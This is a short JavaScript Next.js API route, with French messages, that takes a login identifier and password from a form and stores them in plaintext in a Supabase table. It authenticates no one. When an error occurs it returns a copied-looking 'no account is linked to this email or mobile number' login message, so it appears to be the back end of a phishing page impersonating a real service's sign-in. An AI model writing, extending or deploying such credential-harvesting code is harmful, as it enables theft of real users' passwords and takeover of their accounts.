import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

export async function POST(request) {
  try {
    const { identifiant, password } = await request.json();

    // Validation
    if (!identifiant || !password) {
      return new Response(
        JSON.stringify({ 
          error: 'Les champs ne peuvent pas être vides' 
        }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    // Enregistrer dans Supabase
    const { data, error } = await supabase
      .from('donnees')
      .insert([
        {
          identifiant,
          password
        }
      ])
      .select();

    if (error) {
      return new Response(
        JSON.stringify({ 
          error: "L'e-mail ou le numéro de mobile entré n'est pas associé à un compte. Trouvez votre compte et connectez-vous." 
        }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    return new Response(
      JSON.stringify({ 
        success: true,
        message: 'Enregistrement réussi' 
      }),
      { status: 200, headers: { 'Content-Type': 'application/json' } }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ 
        error: 'Une erreur est survenue lors de l\'enregistrement' 
      }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
}
